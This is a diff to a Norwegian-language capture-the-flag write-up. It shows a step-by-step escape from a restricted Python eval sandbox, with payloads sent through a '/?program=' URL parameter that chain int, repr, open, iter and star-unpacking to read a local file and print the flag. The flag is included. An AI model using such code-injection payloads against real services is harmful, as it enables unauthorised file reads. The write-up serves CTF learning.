@@ -22,5 +22,24 @@ De brukbare funksjonene var altså: open(), int(), repr(), print(), iter(), i ti
 
 Deretter så jeg på hva de ulike funkjsonene vil returnere dersom de blir kallet på. Jeg kjørte ```/?program=print(int())``` og fikk "0" skrevet ut. 
 
-Dette er navnet på filen, og helt klart en nødvendig del av koden
+Dette er navnet på filen, og helt klart en nødvendig del av koden. For å gjøre det om til en string, kan funksjonen repr brukes.
 
+```/?program=print(repr(int()))```
+
+Siden vi vet at filen "0" ligger i samme mappe, kan vi bruke funksjonen open() for å åpne filen
+
+```/?program=print(open(repr(int())))```
+
+Deretter kan vi bruke funksjonen iter() for å gjøre fil-objektet til en *iterable*
+
+```/?program=print(iter(open(repr(int()))))```
+
+Og til slutt har python en funksjonalitet hvor "*" kan brukes som prefiks på en iterable for å hente ut all innholdet
+
+```/?program=print(*iter(open(repr(int()))))```
+
+Dette hentet dermed ut flagget
+
+```
+helsectf{z3r0_p0inters_g1ven}
+```
